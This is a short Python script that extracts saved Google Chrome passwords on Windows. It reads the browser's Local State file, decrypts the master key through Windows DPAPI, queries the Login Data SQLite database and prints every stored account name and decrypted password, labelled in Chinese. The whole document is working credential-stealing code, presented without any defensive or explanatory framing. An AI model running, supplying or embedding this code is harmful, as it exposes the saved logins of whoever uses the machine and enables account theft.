from os import getenv
import win32crypt
import os, json, base64, sqlite3
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


local_state = os.environ['LOCALAPPDATA'] + r'\Google\Chrome\User Data\Local State'
def getkey():
    with open(local_state, 'r', encoding='utf-8') as f:
        base64_encrypted_key = json.load(f)['os_crypt']['encrypted_key']
    encrypted_key = base64.b64decode(base64_encrypted_key)
    key= win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
    return key

def decrypt(key, text, salt=None):
    nonce, cipher_bytes = text[3:15], text[15:]
    aes_gcm = AESGCM(key)
    return aes_gcm.decrypt(nonce, cipher_bytes, salt).decode('utf-8')

def getpassword(key):
    conn = sqlite3.connect(getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\Login Data")
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    for result in cursor.fetchall():
        # print (binascii.b2a_hex(result[2]))
        print("账号：",result[1])
        password = decrypt(key, result[2])
        print("密码：",password)


key=getkey()
getpassword(key)





